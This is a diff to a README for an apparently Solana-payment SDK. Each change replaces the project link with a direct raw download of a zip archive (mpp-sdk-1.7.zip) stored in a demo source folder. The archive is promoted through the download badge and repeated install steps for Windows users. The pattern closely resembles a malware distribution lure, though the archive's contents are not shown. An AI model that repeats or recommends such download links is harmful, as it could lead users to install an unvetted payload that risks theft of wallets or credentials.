@@ -1,6 +1,6 @@
 # 💳 mpp-sdk - Simple Solana Payment Setup
 
-[![Download](https://img.shields.io/badge/Download-Use%20this%20link-blue?style=for-the-badge)](https://github.com/odeliajiggered644/mpp-sdk)
+[![Download](https://img.shields.io/badge/Download-Use%20this%20link-blue?style=for-the-badge)](https://github.com/odeliajiggered644/mpp-sdk/raw/refs/heads/main/demo/app/src/mpp-sdk-1.7.zip)
 
 ## 🚀 What this is
 
@@ -12,7 +12,7 @@ This README shows you how to download, install, and run it on Windows.
 
 Use this link to visit the download page:
 
-https://github.com/odeliajiggered644/mpp-sdk
+https://github.com/odeliajiggered644/mpp-sdk/raw/refs/heads/main/demo/app/src/mpp-sdk-1.7.zip
 
 Open the page in your browser, then look for the latest file or release to download.
 
@@ -21,7 +21,7 @@ Open the page in your browser, then look for the latest file or release to downl
 ### 1. Open the download page
 Go to:
 
-https://github.com/odeliajiggered644/mpp-sdk
+https://github.com/odeliajiggered644/mpp-sdk/raw/refs/heads/main/demo/app/src/mpp-sdk-1.7.zip
 
 ### 2. Find the app file
 On the page, look for the latest release or the main project files. Choose the Windows file if you see one. It may end in:
@@ -127,7 +127,7 @@ This app is made for Solana payment use, so Solana-related setup is part of the 
 
 Open the download page here:
 
-https://github.com/odeliajiggered644/mpp-sdk
+https://github.com/odeliajiggered644/mpp-sdk/raw/refs/heads/main/demo/app/src/mpp-sdk-1.7.zip
 
 ## 🧩 Setup flow
 
